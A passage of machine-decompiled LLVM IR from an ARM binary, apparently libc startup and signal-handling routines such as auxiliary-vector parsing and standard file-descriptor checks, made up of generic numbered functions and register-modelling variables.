  %v9_10ba4 = icmp eq i32 %v4_10ba0, %v1_10ba4
  br i1 %v9_10ba4, label %dec_label_pc_10bac, label %dec_label_pc_10cd0

dec_label_pc_10bac:                               ; preds = %dec_label_pc_10b90
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_10b90, i32* %r0.global-to-local, align 4
  %v2_10bb4 = call i32 @function_1384c(i32 %v2_10b90, i32 17)
  store i32 %v2_10bb4, i32* %r0.global-to-local, align 4
  %v1_10bb8 = load i32, i32* @r5, align 4
  %v9_10bb8 = icmp eq i32 %v2_10bb4, %v1_10bb8
  br i1 %v9_10bb8, label %dec_label_pc_10bd0.preheader, label %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge

dec_label_pc_10bac.dec_label_pc_10c98_crit_edge:  ; preds = %dec_label_pc_10bac
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_10c98

dec_label_pc_10bd0.preheader:                     ; preds = %dec_label_pc_10bac
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %dec_label_pc_10bd0.preheader, %dec_label_pc_10bc8
  %v5_10bd816 = phi i32 [ %v5_10b6417, %dec_label_pc_10bd0.preheader ], [ %v5_10bd8, %dec_label_pc_10bc8 ]
  %v2_10bcc = add i32 %v5_10bd816, -136
  %v3_10bcc = inttoptr i32 %v2_10bcc to i32*
  store i32 0, i32* %v3_10bcc, align 4
  %v0_10bd0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_10bd0 = add i32 %v0_10bd0.pre, -1
  store i32 %v1_10bd0, i32* %r1.global-to-local, align 4
  %v6_10bd0 = icmp slt i32 %v1_10bd0, 0
  %v4_10bd8 = mul i32 %v1_10bd0, 4
  %v5_10bd8 = add i32 %v4_10bd8, %v16_10b3c
  br i1 %v6_10bd0, label %dec_label_pc_10be0, label %dec_label_pc_10bc8

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bc8
  store i32 %v2_10b6c, i32* %r0.global-to-local, align 4
  store i32 17, i32* %r1.global-to-local, align 4
  %v2_10be8 = call i32 @function_13870(i32 %v2_10b6c, i32 17)
  store i32 %v2_10be8, i32* %r0.global-to-local, align 4
  %v1_10bec = icmp slt i32 %v2_10be8, 0
  br i1 %v1_10bec, label %dec_label_pc_10cd0, label %dec_label_pc_10bf4

dec_label_pc_10bf4:                               ; preds = %dec_label_pc_10be0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_10c00 = call i32 @function_11038(i32 17, i32* null, i32 %v2_10b44)
  store i32 %v4_10c00, i32* %r0.global-to-local, align 4
  %v1_10c04 = icmp slt i32 %v4_10c00, 0
  br i1 %v1_10c04, label %dec_label_pc_10c0c, label %dec_label_pc_10c34

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bf4
  %v0_10c0c = call i32 @function_cec4()
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 %v0_10c0c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10c20 = inttoptr i32 %v0_10c0c to i32*
  %v2_10c20 = load i32, i32* %v1_10c20, align 4
  store i32 %v2_10c20, i32* @r4, align 4
  %v3_10c24 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c24 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c24, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_10c2c = load i32, i32* @r4, align 4
  %v1_10c2c = load i32, i32* %r5.global-to-local, align 4
  %v2_10c2c = inttoptr i32 %v1_10c2c to i32*
  store i32 %v0_10c2c, i32* %v2_10c2c, align 4
  %v17_10cd8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10c34:                               ; preds = %dec_label_pc_10bf4
  %v2_10c34 = load i32, i32* %stack_var_-424, align 4
  %v7_10c38 = icmp eq i32 %v2_10c34, 1
  %v2_10c40 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_10c40, i32* @r4, align 4
  br i1 %v7_10c38, label %dec_label_pc_10c48, label %dec_label_pc_10c7c

dec_label_pc_10c48:                               ; preds = %dec_label_pc_10c34
  store i32 %v2_10c40, i32* %r1.global-to-local, align 4
  store i32 %v2_10c40, i32* %r0.global-to-local, align 4
  %v2_10c50 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10c50 = call i32 @function_11378(%timespec* %v2_10c50, i32 %v2_10c40)
  store i32 %v3_10c50, i32* %r0.global-to-local, align 4
  store i32 %v3_10c50, i32* %r6.global-to-local, align 4
  %v0_10c58 = call i32 @function_cec4()
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 %v0_10c58, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10c6c = inttoptr i32 %v0_10c58 to i32*
  %v2_10c6c = load i32, i32* %v1_10c6c, align 4
  store i32 %v2_10c6c, i32* @r4, align 4
  %v3_10c70 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c70 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c70, i32 0)
  store i32 %v4_10c70, i32* %r0.global-to-local, align 4
  %v0_10c74 = load i32, i32* @r4, align 4
  %v1_10c74 = load i32, i32* %r5.global-to-local, align 4
  %v2_10c74 = inttoptr i32 %v1_10c74 to i32*
  store i32 %v0_10c74, i32* %v2_10c74, align 4
  %v0_10ca4.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ca4

dec_label_pc_10c7c:                               ; preds = %dec_label_pc_10c34
  store i32 %v2_10b90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_10c88 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_10c88 = call i32 @function_11494(i32 2, %_TYPEDEF_sigset_t* %v3_10c88, i32 0)
  store i32 %v4_10c88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10c98

dec_label_pc_10c98:                               ; preds = %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge, %dec_label_pc_10c7c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_10bac.dec_label_pc_10c98_crit_edge ], [ %v2_10c40, %dec_label_pc_10c7c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_10c9c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_10c9c = call i32 @function_11378(%timespec* %v2_10c9c, i32 %storemerge.pre-phi)
  store i32 %v3_10c9c, i32* %r0.global-to-local, align 4
  store i32 %v3_10c9c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10ca4

dec_label_pc_10ca4:                               ; preds = %dec_label_pc_10c48, %dec_label_pc_10c98
  %v0_10ca4 = phi i32 [ %v0_10ca4.pr, %dec_label_pc_10c48 ], [ %v3_10c9c, %dec_label_pc_10c98 ]
  %v2_10ca4 = icmp eq i32 %v0_10ca4, 0
  br i1 %v2_10ca4, label %dec_label_pc_10cc8, label %dec_label_pc_10cac

dec_label_pc_10cac:                               ; preds = %dec_label_pc_10ca4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_10cb4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_10cb4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cc8:                               ; preds = %dec_label_pc_10b3c, %dec_label_pc_10ca4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd0:                               ; preds = %dec_label_pc_10b90, %dec_label_pc_10be0, %dec_label_pc_10b6c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cd4

dec_label_pc_10cd4:                               ; preds = %dec_label_pc_10cac, %dec_label_pc_10cc8, %dec_label_pc_10c0c, %dec_label_pc_10cd0
  %v17_10cd8 = phi i32 [ %v3_10cb4, %dec_label_pc_10cac ], [ 0, %dec_label_pc_10cc8 ], [ %v17_10cd8.pre, %dec_label_pc_10c0c ], [ -1, %dec_label_pc_10cd0 ]
  %v2_10cd8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_10cd8, i32* @r4, align 4
  store i32 %v6_10b3c, i32* @r5, align 4
  store i32 %v9_10b3c, i32* @r6, align 4
  ret i32 %v17_10cd8

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_10c40, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_10bd0, { 0, 2, 1 }
  uselistorder i32 %v2_10b90, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_10b88, { 1, 0, 2 }
  uselistorder i32 %v2_10b6c, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10b5c, { 0, 2, 1 }
  uselistorder i32 %v16_10b3c, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 0, 7, 6, 9, 8, 23, 10, 12, 13, 11, 15, 14, 17, 16, 22, 18, 24, 19, 21, 20, 1 }
  uselistorder i32 (i32, i32)* @function_13870, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10cd4, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10cd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10cc8, { 1, 0 }
  uselistorder label %dec_label_pc_10ca4, { 1, 0 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 1, 0 }
  uselistorder label %dec_label_pc_10b54, { 1, 0 }
}

define i32 @function_10ce0(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d0c:
  %stack_var_-8 = alloca i32, align 4
  %v3_10ce0 = load i32, i32* @r4, align 4
  store i32 %v3_10ce0, i32* %stack_var_-8, align 4
  %v2_10d10 = load i32, i32* @global_var_22c84.508, align 4
  %v2_10d14 = icmp eq i32 %v2_10d10, 0
  br i1 %v2_10d14, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10d0c
  call void @__pseudo_branch(i32 %v2_10d10)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10d0c, %bb
  %v2_10d24 = load i32, i32* @global_var_22c88.510, align 4
  %v2_10d28 = icmp eq i32 %v2_10d24, 0
  br i1 %v2_10d28, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_10d2c = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_10d2c, i32* @r4, align 4
  %v9_10d2c = load i32, i32* @r0, align 4
  ret i32 %v9_10d2c

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_10d24)
  %v2_10d38 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10d38, i32* @r4, align 4
  %v8_10d38 = load i32, i32* @r0, align 4
  ret i32 %v8_10d38

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_10d4c() local_unnamed_addr {
dec_label_pc_10d4c:
  ret i32 0
}

define i32 @function_10d54() local_unnamed_addr {
dec_label_pc_10d54:
  %v1_10d54 = load i32, i32* @r0, align 4
  ret i32 %v1_10d54
}

define i32 @function_10d58(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10d58:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_10d58 = load i32, i32* @r4, align 4
  store i32 %v3_10d58, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_10d68 = call i32 @function_11158(i32 %arg1, i32 1)
  %v7_10d6c = icmp eq i32 %v2_10d68, -1
  br i1 %v7_10d6c, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_10d58
  %v3_10d70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10d70, i32* @r4, align 4
  ret i32 %v2_10d68

bb4:                                              ; preds = %dec_label_pc_10d58
  %v0_10d74 = load i32, i32* @r4, align 4
  %v4_10d7c = call i32 @function_113a4(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_17ac0.513, i32 0, i32 0), i32 %v0_10d74)
  %v1_10d80 = load i32, i32* %r5.global-to-local, align 4
  %v9_10d80 = icmp eq i32 %v4_10d7c, %v1_10d80
  br i1 %v9_10d80, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_10d84 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_10d84, i32* @r4, align 4
  ret i32 %v4_10d7c

bb6:                                              ; preds = %bb4
  %v0_10d88 = call i32 @function_1021c()
  %v0_10d8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10d8c, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_10d88

; uselistorder directives
  uselistorder i32 %v2_10d68, { 1, 0 }
  uselistorder i32 ()* @function_1021c, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_10d90(i32 %arg1) local_unnamed_addr {
dec_label_pc_10d90:
  %v2_10d94 = load i32, i32* @global_var_22c8c.515, align 4
  %v2_10d98 = icmp eq i32 %v2_10d94, 0
  br i1 %v2_10d98, label %bb3, label %bb

bb:                                               ; preds = %dec_label_pc_10d90
  %v6_10da4 = load i32, i32* @r0, align 4
  ret i32 %v6_10da4

bb3:                                              ; preds = %dec_label_pc_10d90
  store i32 1, i32* @global_var_22c8c.515, align 4
  store i32 4096, i32* @global_var_22c80.274, align 4
  %v0_10dd8 = call i32 @function_d790()
  ret i32 %v0_10dd8
}

define i32 @function_10dec(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_10dec:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_10df0 = mul i32 %arg2, 4
  %v5_10df0 = add i32 %tmp, %v4_10df0
  %v2_10df4 = load i32, i32* %arg3, align 4
  %v2_10df8 = ptrtoint i32* %stack_var_-120 to i32
  %v1_10dfc = add i32 %v5_10df0, 4
  store i32 %v1_10dfc, i32* @ip, align 4
  %v9_10e00 = icmp eq i32 %v1_10dfc, %v2_10df4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_22c78.521, align 4
  store i32 %v1_10dfc, i32* @global_var_22c7c.502, align 4
  store i32 %arg6, i32* @global_var_22c88.510, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_10e00, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_10dec
  store i32 %v5_10df0, i32* @global_var_22c7c.502, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_10dec, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_10e40 = bitcast i32* %stack_var_-120 to i8*
  %v3_10e40 = call i32 @function_ef70(i8* %v2_10e40, i32 0)
  %storemerge.pre = load i32, i32* @global_var_22c7c.502, align 4
  br label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e50, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_10e50, %dec_label_pc_10e50 ]
  %v1_10e50 = inttoptr i32 %storemerge to i32*
  %v2_10e50 = load i32, i32* %v1_10e50, align 4
  %v4_10e50 = add i32 %storemerge, 4
  %v2_10e54 = icmp eq i32 %v2_10e50, 0
  br i1 %v2_10e54, label %dec_label_pc_10e60, label %dec_label_pc_10e50

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e50
  store i32 %v4_10e50, i32* @r4, align 4
  %v1_10e8022 = inttoptr i32 %v4_10e50 to i32*
  %v2_10e8023 = load i32, i32* %v1_10e8022, align 4
  %v2_10e8425 = icmp eq i32 %v2_10e8023, 0
  br i1 %v2_10e8425, label %dec_label_pc_10e8c, label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e60, %dec_label_pc_10e80
  %v5_10e6c = phi i32 [ %v2_10e80, %dec_label_pc_10e80 ], [ %v2_10e8023, %dec_label_pc_10e60 ]
  %v2_10e68 = icmp ugt i32 %v5_10e6c, 13
  %v7_10e68 = icmp eq i32 %v5_10e6c, 14
  %v2_10e6c = xor i1 %v2_10e68, true
  %v3_10e6c = or i1 %v7_10e68, %v2_10e6c
  br i1 %v3_10e6c, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_10e68
  %v6_10e6c = and i32 %v5_10e6c, 536870912
  %v7_10e6c = icmp ne i32 %v6_10e6c, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_10e68, %bb42
  %v1_10e78 = phi i1 [ %v2_10e68, %dec_label_pc_10e68 ], [ %v7_10e6c, %bb42 ]
  %v2_10e70 = xor i1 %v1_10e78, true
  %v3_10e70 = or i1 %v7_10e68, %v2_10e70
  br i1 %v3_10e70, label %bb44, label %dec_label_pc_10e80

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_10e70, i32 ptrtoint ([3 x i8]* @global_var_ef60.420 to i32))
  %v0_10e7c = load i32, i32* @r4, align 4
  %v1_10e7c = add i32 %v0_10e7c, 8
  store i32 %v1_10e7c, i32* @r4, align 4
  %v1_10e80 = inttoptr i32 %v1_10e7c to i32*
  %v2_10e80 = load i32, i32* %v1_10e80, align 4
  %v2_10e84 = icmp eq i32 %v2_10e80, 0
  br i1 %v2_10e84, label %dec_label_pc_10e8c, label %dec_label_pc_10e68

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e80, %dec_label_pc_10e60
  %v1_10e90 = call i32 @function_138b8(i32 %v2_10df8)
  store i32 %v1_10e90, i32* @r0, align 4
  %v1_10e94 = call i32 @function_10d90(i32 %v1_10e90)
  store i32 %v1_10e94, i32* @r0, align 4
  %v2_10ea0 = icmp eq i32 %tmp37, 0
  br i1 %v2_10ea0, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_10e8c
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_10e8c, %bb45
  %v0_10eb0 = phi i32 [ %tmp37, %dec_label_pc_10e8c ], [ 4096, %bb45 ]
  %v3_10ea8 = icmp eq i32 %tmp36, -1
  %v8_10ea8 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_22c80.274 to i32), i32* @r2, align 4
  store i32 %v0_10eb0, i32* @global_var_22c80.274, align 4
  br i1 %v3_10ea8, label %dec_label_pc_10eb8, label %dec_label_pc_10ee0

dec_label_pc_10eb8:                               ; preds = %bb46
  %v0_10eb8 = call i32 @function_1134c()
  store i32 %v0_10eb8, i32* @r0, align 4
  store i32 %v0_10eb8, i32* @r4, align 4
  %v0_10ec0 = call i32 @function_112f4()
  %v0_10ec4 = load i32, i32* @r4, align 4
  %v9_10ec4 = icmp eq i32 %v0_10ec4, %v0_10ec0
  br i1 %v9_10ec4, label %dec_label_pc_10ecc, label %dec_label_pc_10f08

dec_label_pc_10ecc:                               ; preds = %dec_label_pc_10eb8
  %v1_10ecc = call i32 @function_11320(i32 %v0_10ec0)
  store i32 %v1_10ecc, i32* @r0, align 4
  store i32 %v1_10ecc, i32* @r4, align 4
  %v0_10ed4 = call i32 @function_112c8()
  %v0_10ed8 = load i32, i32* @r4, align 4
  %v9_10ed8 = icmp eq i32 %v0_10ed8, %v0_10ed4
  br i1 %v9_10ed8, label %dec_label_pc_10ee0, label %dec_label_pc_10f08

dec_label_pc_10ee0:                               ; preds = %dec_label_pc_10ecc, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_10ea8, label %dec_label_pc_10f74, label %dec_label_pc_10eec

dec_label_pc_10eec:                               ; preds = %dec_label_pc_10ee0
  %v9_10ef0 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_10ef0, label %dec_label_pc_10ef8, label %dec_label_pc_10f08

dec_label_pc_10ef8:                               ; preds = %dec_label_pc_10eec
  br label %dec_label_pc_10f08

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10ef8, %dec_label_pc_10eec, %dec_label_pc_10ecc, %dec_label_pc_10eb8
  %v2_10f10 = call i32 @function_10d58(i32 0, i32 32768)
  %v2_10f1c = call i32 @function_10d58(i32 1, i32 32770)
  %v2_10f28 = call i32 @function_10d58(i32 2, i32 32770)
  br label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f08, %dec_label_pc_10ee0
  %v0_10f38 = load i32, i32* @r6, align 4
  %v1_10f38 = inttoptr i32 %v0_10f38 to i32*
  %v2_10f38 = load i32, i32* %v1_10f38, align 4
  store i32 %v2_10f38, i32* @global_var_205e8, align 4
  store i32 %arg5, i32* @global_var_22c84.508, align 4
  %v2_10f74 = icmp eq i32 %arg4, 0
  br i1 %v2_10f74, label %dec_label_pc_10fb0, label %bb47

bb47:                                             ; preds = %dec_label_pc_10f74
  br label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10f74, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_10fc0 = call i32 @function_cec4()
  %v2_10fc8 = inttoptr i32 %v1_10fc0 to i32*
  store i32 0, i32* %v2_10fc8, align 4
  %v1_10fdc = call i32 @function_11514()
  %v2_10fe4 = inttoptr i32 %v1_10fdc to i32*
  store i32 0, i32* %v2_10fe4, align 4
  %v0_10ff4 = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_11000 = call i32 @function_10a14(i32 %v0_10ff4)
  ret i32 %v1_11000

; uselistorder directives
  uselistorder i32 %v2_10e80, { 1, 0 }
  uselistorder i32 %v1_10e7c, { 1, 0 }
  uselistorder i1 %v2_10e68, { 1, 0 }
  uselistorder i32 %v4_10e50, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @function_10a14, { 0, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 5, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_10d58, { 2, 1, 0 }
  uselistorder i32* @global_var_22c80.274, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 14, { 1, 0 }
  uselistorder i32 13, { 1, 2, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10fb0, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_10e80, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_10e68, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @function_11038(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_11038:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_11038 = load i32, i32* @r4, align 4
  %v6_11038 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1103c = icmp eq i32* %arg2, null
  %v2_11040 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_1103c, label %dec_label_pc_110ac, label %dec_label_pc_11050

dec_label_pc_11050:                               ; preds = %dec_label_pc_11038
  %v2_11054 = load i32, i32* %arg2, align 4
  %v4_11054 = add i32 %tmp, 4
  store i32 %v4_11054, i32* @r1, align 4
  %v2_11058 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_11058, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_11054, i32* %stack_var_-156, align 4
  %v0_11064 = call i32 @function_ef60()
  store i32 %v0_11064, i32* %r0.global-to-local, align 4
  %v0_11068 = load i32, i32* @r4, align 4
  %v1_11068 = add i32 %v0_11068, 132
  %v2_11068 = inttoptr i32 %v1_11068 to i32*
  %v3_11068 = load i32, i32* %v2_11068, align 4
  %v1_1106c = and i32 %v3_11068, 67108864
  %v2_1106c = icmp eq i32 %v1_1106c, 0
  br i1 %v2_1106c, label %dec_label_pc_11080, label %bb

bb:                                               ; preds = %dec_label_pc_11050
  br label %dec_label_pc_1109c

dec_label_pc_11080:                               ; preds = %dec_label_pc_11050
  %v1_11088 = and i32 %v3_11068, 4
  %v2_11088 = icmp eq i32 %v1_11088, 0
  br i1 %v2_11088, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_11080
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_11080, %bb20
  br label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %bb, %bb21
  %v2_1109c = icmp eq i32 %v0_11068, 0
  %v3_110a0 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_110a0 = select i1 %v2_1109c, i32 0, i32 %v3_110a0
  %v0_110ac.pre = load i32, i32* @r5, align 4
  %v0_110bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_110ac

dec_label_pc_110ac:                               ; preds = %dec_label_pc_1109c, %dec_label_pc_11038
  %v0_110bc = phi i32 [ %arg1, %dec_label_pc_11038 ], [ %v0_110bc.pre, %dec_label_pc_1109c ]
  %v0_110ac = phi i32 [ %arg3, %dec_label_pc_11038 ], [ %v0_110ac.pre, %dec_label_pc_1109c ]
  %storemerge = phi i32 [ 0, %dec_label_pc_11038 ], [ %.v3_110a0, %dec_label_pc_1109c ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_110ac = icmp eq i32 %v0_110ac, 0
  %.v2_11040 = select i1 %v2_110ac, i32 0, i32 %v2_11040
  store i32 %.v2_11040, i32* @r2, align 4
  store i32 %v0_110bc, i32* %r0.global-to-local, align 4
  %v1_110c0 = call i32 @function_1121c(i32 %v0_110bc)
  store i32 %v1_110c0, i32* %r0.global-to-local, align 4
  %v0_110c4 = load i32, i32* @r5, align 4
  %v2_110c4 = icmp eq i32 %v0_110c4, 0
  br i1 %v2_110c4, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_110ac
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_110ac, %bb25
  %v0_110d4.pr = phi i32 [ 0, %dec_label_pc_110ac ], [ 1, %bb25 ]
  %v1_110cc = icmp slt i32 %v1_110c0, 0
  br i1 %v1_110cc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_11108

thread-pre-split:                                 ; preds = %bb26
  %v2_110d4 = icmp eq i32 %v0_110d4.pr, 0
  store i32 %v1_110c0, i32* @r4, align 4
  br i1 %v2_110d4, label %dec_label_pc_11108, label %dec_label_pc_110e0

dec_label_pc_110e0:                               ; preds = %thread-pre-split
  %v2_110e0 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_110c4, i32* %r0.global-to-local, align 4
  %v2_110e8 = inttoptr i32 %v0_110c4 to i32*
  store i32 %v2_110e0, i32* %v2_110e8, align 4
  %v3_110e8 = load i32, i32* %r0.global-to-local, align 4
  %v4_110e8 = add i32 %v3_110e8, 4
  store i32 %v4_110e8, i32* @r0, align 4
  %v2_110ec = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_110ec, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_110f4 = call i32 @function_ef60()
  store i32 %v0_110f4, i32* %r0.global-to-local, align 4
  %v1_110fc = load i32, i32* @r5, align 4
  %v2_110fc = add i32 %v1_110fc, 136
  %v3_110fc = inttoptr i32 %v2_110fc to i32*
  %v1_11104 = load i32, i32* @r5, align 4
  %v2_11104 = add i32 %v1_11104, 132
  %v3_11104 = inttoptr i32 %v2_11104 to i32*
  %v0_11108.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_110e0
  %v0_11108 = phi i32 [ %v1_110c0, %thread-pre-split ], [ %v0_11108.pre, %dec_label_pc_110e0 ], [ %v1_110c0, %thread-pre-split.thread ]
  store i32 %v0_11108, i32* %r0.global-to-local, align 4
  store i32 %v3_11038, i32* @r4, align 4
  store i32 %v6_11038, i32* @r5, align 4
  ret i32 %v0_11108

; uselistorder directives
  uselistorder i32 %v0_11108, { 1, 0 }
  uselistorder i32 %v0_110c4, { 1, 0, 2 }
  uselistorder i32 %v0_110bc, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 6, 4, 5, 2, 7, 1, 0 }
  uselistorder label %dec_label_pc_11108, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_1109c, { 1, 0 }
